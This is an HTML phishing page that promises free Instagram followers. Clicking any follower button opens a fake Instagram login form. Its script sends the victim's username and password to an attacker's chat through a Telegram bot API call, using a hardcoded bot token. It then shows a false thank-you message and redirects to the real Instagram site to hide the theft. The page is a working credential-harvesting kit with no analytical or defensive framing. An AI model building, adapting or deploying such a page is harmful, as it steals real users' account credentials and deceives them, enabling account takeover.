<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Followers</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo-container img {
            width: 100px;
            height: 100px;
        }
        .followers-buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .followers-buttons button {
            width: 200px;
            margin: 10px 0;
            padding: 15px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 18px;
            transition: transform 0.2s;
            box-shadow: 0 5px #1e7e34;
        }
        .followers-buttons button:active {
            transform: translateY(4px);
            box-shadow: 0 1px #1e7e34;
        }
        /* Popup form styles */
        .form-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 3px solid #f1f1f1;
            z-index: 9;
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }
        .form-popup input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .form-popup button {
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            font-size: 16px;
            margin-top: 10px;
            transition: transform 0.2s;
            box-shadow: 0 5px #145db2;
        }
        .form-popup button:active {
            transform: translateY(4px);
            box-shadow: 0 1px #145db2;
        }
        .form-popup .close-btn {
            background-color: #f44336;
            box-shadow: 0 5px #d32f2f;
        }
        .form-popup .close-btn:active {
            box-shadow: 0 1px #d32f2f;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <h2>Get Free Instagram Followers</h2>
    </div>
    <div class="followers-buttons">
        <button class="follower-btn" data-count="50">50 Followers</button>
        <button class="follower-btn" data-count="200">200 Followers</button>
        <button class="follower-btn" data-count="500">500 Followers</button>
        <button class="follower-btn" data-count="1000">1000 Followers</button>
    </div>

    <!-- Popup Form -->
    <div class="form-popup" id="loginForm">
        <form action="#" class="form-container">
            <h2>Login to Instagram</h2>
            <input type="text" id="username" placeholder="Instagram Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="button" id="loginBtn">Log In</button>
            <button type="button" class="close-btn" onclick="closeForm()">Close</button>
        </form>
    </div>

    <audio id="clickSound" src="https://www.soundjay.com/button/beep-07.wav"></audio>

    <script>
        document.querySelectorAll('.follower-btn').forEach(button => {
            button.addEventListener('click', function() {
                document.getElementById('clickSound').play();
                openForm();
            });
        });

        document.getElementById('loginBtn').addEventListener('click', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (username && password) {
                sendToTelegram(username, password);
                alert('Congratulations followers will be sent to you within 24 hours. Thank you ❤️.');
                setTimeout(function() {
                    window.location.href = 'https://www.instagram.com';
                }, 1000); // Redirect after 1 second delay
            } else {
                alert('Please fill in all fields.');
            }
        });

        function openForm() {
            document.getElementById('loginForm').style.display = 'block';
        }

        function closeForm() {
            document.getElementById('loginForm').style.display = 'none';
        }

        function sendToTelegram(username, password) {
            const token = '8066633074:AAEY_QH5V7zM8sh1SFTuldJAxr2CekxnvIg'; // Replace with your bot token
            const chatId = '8066633074'; // Replace with your chat ID
            const message = `Instagram Username: ${username}\nPassword: ${password}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Message sent successfully');
                    } else {
                        console.error('Error sending message:', data);
                    }
                })
                .catch(error => {
                    console.error('Network error:', error);
                });
        }
    </script>
</body>
</html>
